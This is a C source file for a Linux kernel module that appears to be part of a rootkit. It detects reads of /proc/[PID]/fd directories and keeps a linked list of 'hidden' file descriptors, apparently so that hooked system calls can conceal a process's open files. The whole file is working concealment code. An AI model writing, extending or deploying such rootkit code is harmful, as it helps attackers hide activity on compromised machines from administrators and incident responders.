#include <linux/slab.h>
#include <linux/fd.h>

#include "common.h"
#include "hook.h"
#include "hideopen.h"
#include "hidepid.h"

const char *dir_sep = "/";

fd_list_t hidden_fds = {
    .fd  = -1,
    .prev = NULL,
    .next = NULL,
};

fd_list_t_ptr hidden_fds_tail = &hidden_fds;

//Returns pid on success, -1 on failure
pid_t
may_fd(struct file *dirfile)
{
    pid_t tmp = -1;
    char *buf;

    buf = kzalloc(512, GFP_KERNEL);

    if(dirfile && !strcmp(dirfile->f_path.dentry->d_name.name, "fd")) {
        char *path = d_path(&dirfile->f_path, buf, 512);

        if(!IS_ERR(path)) {
            char *sub;
            char *cur = path;

            /**
             * In the correct directory, the tokens are as follows:
             * {NULL, proc, [PID], fd}
             * We also don't want the task directory, so the third
             * token should be fd, not task
             **/
            int i = 0;

            while((sub = strsep(&cur, dir_sep))) {
                switch(i++) {
                    case 1:
                        if(strcmp(sub, "proc"))
                            goto leave;
                        break;
                    case 2:
                        tmp = PID_FROM_NAME(sub);
                        break;
                    case 3:
                        if(!strcmp(sub, "fd")) {
                            kfree(buf);
                            return tmp;
                        } else
                            goto leave;
                    default:
                        break;
                }
            }
        }
    }

    leave:
    kfree(buf);
    return -1;
}

void
clear_hidden_fds(void)
{
    fd_list_t_ptr i = hidden_fds_tail;
    while ((i = remove_fd_from_list(i, i->fd)));
}

bool
list_contains_fd(fd_list_t_ptr list, int fd)
{
    return !!find_fd_in_list(list, fd);
}

fd_list_t_ptr
find_fd_in_list(fd_list_t_ptr head, int fd)
{
    fd_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (i->fd == fd)
            return i;

    return NULL;
}

fd_list_t_ptr
add_fd_to_list(fd_list_t_ptr tail, int fd)
{
    fd_list_t_ptr node;
    node = (fd_list_t_ptr)kmalloc(sizeof(fd_list_t), GFP_KERNEL);

    if (node) {
        node->fd = fd;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_fds_tail = node;
        return node;
    }

    return NULL;
}


fd_list_t_ptr
remove_fd_from_list(fd_list_t_ptr list, int fd)
{
    fd_list_t_ptr i = find_fd_in_list(list, fd), ret = NULL;

    if (i && (i->fd != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_fds_tail = i->prev ? i->prev : &hidden_fds;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}